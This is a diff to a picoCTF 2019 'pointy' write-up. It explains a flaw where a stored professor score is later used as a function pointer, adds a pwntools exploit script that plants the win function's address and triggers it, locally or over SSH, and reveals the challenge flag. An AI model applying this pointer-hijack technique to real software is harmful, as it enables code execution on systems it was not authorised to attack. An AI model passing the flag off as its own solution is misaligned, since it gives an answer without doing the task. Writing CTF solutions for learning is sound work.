@@ -105,4 +105,49 @@ int main (int argc, char **argv)
 ```
 </details>
 
-Looks like the vulnerability is scanf in the last part. 
+Looks like the vulnerability is scanf in the last part. The program gives scores to professors and stores them in memory printing them based on the student that scored them
+
+This means if we student X gives professor Y a score of the win function, when we score again we can give the professors name as the students in order to call the win function when the score is printed
+
+<details>
+    <summary>exploit</summary>
+
+```python
+#!/usr/bin/env python
+
+from pwn import *
+import sys
+
+argv = sys.argv
+
+e = ELF('./vuln')
+win = e.symbols['win']
+
+if len(argv) > 1:
+    from getpass import getpass
+    ssh = ssh(host='2019shell1.picoctf.com', user='ems3t', password=getpass())
+    p = ssh.process('vuln', cwd='/problems/pointy_2_030e643c8a0e842516b1c6a3ff826144')
+else:
+    p = process('./vuln')
+
+p.sendlineafter('\n', 'bob')
+p.sendlineafter('\n', 'frank')
+p.sendlineafter('\n', 'bob')
+p.sendlineafter('\n', 'frank')
+p.sendlineafter('\n', str(win))         #store win function as franks score
+
+p.sendlineafter('student\n', 'bill')
+p.sendlineafter('\n', 'jerry')
+p.sendlineafter('\n', 'frank')          #win function here
+p.sendlineafter('\n', 'jerry')
+p.sendlineafter('\n', '0')              #win function called here
+
+p.interactive()
+```
+</details>
+
+<details>
+    <summary>Flag</summary>
+
+picoCTF{g1v1ng_d1R3Ct10n5_cad9c1b8}
+</details>
